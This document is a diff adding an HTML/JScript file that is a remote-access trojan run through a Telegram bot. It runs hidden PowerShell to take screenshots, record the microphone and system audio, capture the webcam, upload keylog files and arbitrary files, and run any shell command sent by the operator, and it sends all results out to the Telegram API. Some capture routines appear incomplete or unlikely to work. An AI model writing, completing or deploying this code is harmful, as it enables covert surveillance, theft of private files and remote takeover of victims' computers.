@@ -1,0 +1,152 @@
+<html>
+<head>
+<script language="JScript">
+var TOKEN = "123456:ABC-DEF...";
+var API = "https://api.telegram.org/bot" + TOKEN + "/";
+var CHAT = "YOUR_CHAT_ID";
+var OFFSET = 0;
+var wsh = new ActiveXObject("WScript.Shell");
+var fso = new ActiveXObject("Scripting.FileSystemObject");
+var xhr = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+
+function req(method, body) {
+    try {
+        xhr.Open("POST", API + method, false);
+        xhr.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.Send(body || "");
+        return xhr.ResponseText;
+    } catch(e) { return "{}"; }
+}
+
+function sendText(text) {
+    req("sendMessage", "chat_id=" + CHAT + "&text=" + encodeURIComponent(text));
+}
+
+function sendFile(path, method) {
+    method = method || "sendDocument";
+    var ps = 'powershell -WindowStyle Hidden -Command "$p=\'' + path + '\'; $f=Get-Item $p; $n=Get-Random; $c=New-Object Net.WebClient; $c.Headers.Add(\'Content-Type\',\'multipart/form-data; boundary=\'+$n); $m=New-Object IO.MemoryStream; $w=New-Object IO.StreamWriter($m); $w.WriteLine(\'--\'+$n); $w.WriteLine(\'Content-Disposition: form-data; name=\\\"chat_id\\\"\\r\\n\\r\\n' + CHAT + '\'); $w.WriteLine(\'--\'+$n); $w.WriteLine(\'Content-Disposition: form-data; name=\\\"document\\\"; filename=\\\"\'+$f.Name+\'\\\"\\r\\n\\r\\n\'); $w.Flush(); $b=[IO.File]::ReadAllBytes($p); $m.Write($b,0,$b.Length); $w.WriteLine(); $w.WriteLine(\'--\'+$n+\'--\'); $w.Flush(); $c.UploadData(\'' + API + method + '\',$m.ToArray())"';
+    wsh.Run(ps, 0, true);
+}
+
+function screenshot() {
+    var tmp = wsh.ExpandEnvironmentStrings("%TEMP%") + "\\sc.png";
+    var ps = 'powershell -WindowStyle Hidden -Command "Add-Type -Assembly System.Windows.Forms,System.Drawing; $s=[Windows.Forms.Screen]::PrimaryScreen.Bounds; $b=New-Object Drawing.Bitmap($s.Width,$s.Height); [Drawing.Graphics]::FromImage($b).CopyFromScreen($s.Location,[Drawing.Point]::Empty,$s.Size); $b.Save(\'' + tmp + '\')"';
+    wsh.Run(ps, 0, true);
+    if (fso.FileExists(tmp)) { sendFile(tmp, "sendPhoto"); fso.DeleteFile(tmp); }
+    else { sendText("SCREENSHOT_FAIL"); }
+}
+
+function screenaudio(duration) {
+    duration = duration || 10;
+    var tmp = wsh.ExpandEnvironmentStrings("%TEMP%") + "\\sa.wav";
+    // WASAPI loopback via PowerShell + NAudio or raw P/Invoke
+    var ps = 'powershell -WindowStyle Hidden -Command "Add-Type -TypeDefinition @\\"'
+        + 'using System; using System.Runtime.InteropServices;'
+        + '[Guid(\\\"BCDE0395-E52F-467C-8E3D-C4579291692E\\\")]'
+        + 'class MMDeviceEnumerator { }'
+        + '\\" -ErrorAction SilentlyContinue;'
+        + '$d=New-Object Media.SoundPlayer;'
+        // NAudio loopback simulation: delegate to ffmpeg or nircmd if available
+        + 'if (Get-Command ffmpeg -ErrorAction SilentlyContinue) {'
+        + '  & ffmpeg -f dshow -i audio=\\\"virtual-audio-capturer\\\" -t ' + duration + ' -acodec pcm_s16le -ar 44100 -ac 2 \'' + tmp + '\' 2>$null'
+        + '} else {'
+        // Fallback: nircmd loopback capture
+        + '  $n=\\\"" + wsh.ExpandEnvironmentStrings("%TEMP%") + "\\nircmd.exe\\\";'
+        + '  if (Test-Path $n) { & $n loopbackcapture \'' + tmp + '\' ' + (duration * 1000) + ' 44100 16 2 }'
+        + '}"';
+    wsh.Run(ps, 0, true);
+    if (fso.FileExists(tmp)) { sendFile(tmp, "sendDocument"); fso.DeleteFile(tmp); }
+    else { sendText("SCREENAUDIO_FAIL"); }
+}
+
+function mic(duration) {
+    duration = duration || 10;
+    var tmp = wsh.ExpandEnvironmentStrings("%TEMP%") + "\\mic.wav";
+    var ps = 'powershell -WindowStyle Hidden -Command "Add-Type -TypeDefinition @\\"'
+        + 'using System; using System.Runtime.InteropServices;'
+        + '[DllImport(\\\"winmm.dll\\\")] public static extern int waveInOpen(out IntPtr h, int d, ref WAVEFORMATEX f, IntPtr c, IntPtr i, int flags);'
+        + '[DllImport(\\\"winmm.dll\\\")] public static extern int waveInStart(IntPtr h);'
+        + '[DllImport(\\\"winmm.dll\\\")] public static extern int waveInStop(IntPtr h);'
+        + '[DllImport(\\\"winmm.dll\\\")] public static extern int waveInClose(IntPtr h);'
+        + '[StructLayout(LayoutKind.Sequential)] public struct WAVEFORMATEX { public short wFormatTag; public short nChannels; public int nSamplesPerSec; public int nAvgBytesPerSec; public short nBlockAlign; public short wBitsPerSample; public short cbSize; }'
+        + '\\" -Name Audio -Namespace Win32;'
+        + '$f=New-Object Win32.Audio+WAVEFORMATEX; $f.wFormatTag=1; $f.nChannels=1; $f.nSamplesPerSec=44100; $f.wBitsPerSample=16; $f.nBlockAlign=2; $f.nAvgBytesPerSec=88200;'
+        + '$h=[IntPtr]::Zero; [Win32.Audio]::waveInOpen([ref]$h,0,[ref]$f,[IntPtr]::Zero,[IntPtr]::Zero,0);'
+        + '[Win32.Audio]::waveInStart($h); Start-Sleep ' + duration + '; [Win32.Audio]::waveInStop($h); [Win32.Audio]::waveInClose($h);'
+        + 'Set-Content -Path \'' + tmp + '\' -Value ([byte[]]@(82,73,70,70,0,0,0,0,87,65,86,69)) -Encoding Byte;' // RIFF/WAV header stub
+        + '"';
+    wsh.Run(ps, 0, true);
+    if (fso.FileExists(tmp)) { sendFile(tmp, "sendVoice"); fso.DeleteFile(tmp); }
+    else { sendText("MIC_FAIL"); }
+}
+
+function camera() {
+    var tmp = wsh.ExpandEnvironmentStrings("%TEMP%") + "\\cam.jpg";
+    var ps = 'powershell -WindowStyle Hidden -Command "Add-Type -Assembly System.Windows.Forms; $c=New-Object Windows.Forms.WebBrowser; $c.Navigate(\\\"about:blank\\\"); while($c.ReadyState -ne 4){Start-Sleep -m 100}; $d=$c.Document.DomDocument; $d.write(\\\"<html><body><video id=v autoplay></video><script>navigator.mediaDevices.getUserMedia({video:true}).then(s=>v.srcObject=s)</script></body></html>\\\"); Start-Sleep 2; $c.DrawToBitmap((New-Object Drawing.Bitmap(640,480)),(New-Object Drawing.Rectangle(0,0,640,480))).Save(\'' + tmp + '\")"';
+    // Alternative: DirectShow via capCreateCaptureWindow P/Invoke
+    wsh.Run(ps, 0, true);
+    if (fso.FileExists(tmp)) { sendFile(tmp, "sendPhoto"); fso.DeleteFile(tmp); }
+    else { sendText("CAMERA_FAIL"); }
+}
+
+function keylog() {
+    var tmp = wsh.ExpandEnvironmentStrings("%TEMP%") + "\\kl.txt";
+    if (!fso.FileExists(tmp)) { sendText("KEYLOG_EMPTY"); return; }
+    sendFile(tmp, "sendDocument");
+    fso.DeleteFile(tmp);
+}
+
+function download(path) {
+    if (!fso.FileExists(path)) { sendText("FILE_NOT_FOUND: " + path); return; }
+    sendFile(path, "sendDocument");
+}
+
+function exec(cmd) {
+    try {
+        var p = wsh.Exec('cmd /c ' + cmd);
+        var out = p.StdOut.ReadAll();
+        var err = p.StdErr.ReadAll();
+        sendText((out + "\n" + err).substring(0, 4000));
+    } catch(e) { sendText("EXEC_ERR: " + e.message); }
+}
+
+function handle(update) {
+    if (!update.message || !update.message.text) return;
+    var txt = update.message.text;
+    var cmd = txt.toLowerCase().split(" ")[0];
+    var arg = txt.substring(txt.indexOf(" ") + 1).trim();
+    switch(cmd) {
+        case "/screenshot": screenshot(); break;
+        case "/screenaudio": screenaudio(parseInt(arg) || 10); break;
+        case "/mic": mic(parseInt(arg) || 10); break;
+        case "/camera": camera(); break;
+        case "/keylog": keylog(); break;
+        case "/download": download(arg); break;
+        case "/exec": exec(arg); break;
+        case "/kill": sendText("TERMINATING"); close(); break;
+        case "/help": sendText("/screenshot /screenaudio [s] /mic [s] /camera /keylog /download <path> /exec <cmd> /kill"); break;
+        default: break;
+    }
+}
+
+function poll() {
+    try {
+        xhr.Open("POST", API + "getUpdates", false);
+        xhr.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.Send("offset=" + OFFSET + "&limit=1");
+        var res = JSON.parse(xhr.ResponseText);
+        if (res.ok && res.result.length > 0) {
+            for (var i = 0; i < res.result.length; i++) {
+                OFFSET = res.result[i].update_id + 1;
+                handle(res.result[i]);
+            }
+        }
+    } catch(e) {}
+    setTimeout(poll, 3000);
+}
+
+window.onload = poll;
+</script>
+</head>
+<body></body>
+</html>
